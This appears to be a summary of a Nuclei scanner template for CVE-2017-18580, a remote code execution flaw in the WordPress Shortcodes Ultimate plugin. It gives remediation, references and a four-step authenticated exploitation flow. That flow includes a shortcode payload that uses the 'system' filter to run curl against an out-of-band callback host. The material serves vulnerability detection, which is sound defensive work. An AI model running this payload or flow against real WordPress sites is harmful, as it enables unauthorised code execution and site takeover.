---
cve_id: CVE-2017-18580
template_path: nuclei-templates/http/cves/2017/CVE-2017-18580.yaml
affected_product: WordPress Shortcodes Ultimate
severity: critical
authentication: required
external_callback: true
affected_versions: <= 5.0.0
preconditions: authenticated WordPress user with post creation/editing permissions
poc_classification: rce
---

## Vulnerability
Shortcodes Ultimate plugin before 5.0.1 for WordPress contains a remote code execution caused by a filter in meta, post, or user shortcode, letting remote attackers execute arbitrary code (exploit requires sending crafted shortcode data). Impact: remote attackers can execute arbitrary code on the server, potentially leading to full site compromise. Remediation: update to version 5.0.1 or later. CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (score 8.8). CWE-94.

## PoC / Detection
Classification: rce

The template performs a 4-step authenticated exploitation flow using interactsh OOB detection to verify RCE:
- POST /wp-login.php with provided {{username}}/{{password}} (verifies 302 + wordpress_logged_in cookie).
- GET /wp-admin/post-new.php and extracts _wpnonce + post_ID via regex from body.
- POST /wp-admin/post.php creating a draft with malicious payload `[su_meta key=1 post_id=1 default='curl {{interactsh-url}}' filter='system']` in content (verifies 302).
- GET /?p={{post_id}}&preview=true to trigger shortcode rendering; succeeds if interactsh receives DNS or HTTP callback.

## References
- https://wpscan.com/vulnerability/efad59c8-e6ae-4167-9c78-d3ea52fe5bba/
- https://plugins.trac.wordpress.org/changeset/1756323/shortcodes-ultimate
- https://blog.sucuri.net/2017/11/formidable-forms-shortcodes-ultimate-exploits-in-the-wild.html
- https://nvd.nist.gov/vuln/detail/CVE-2017-18580
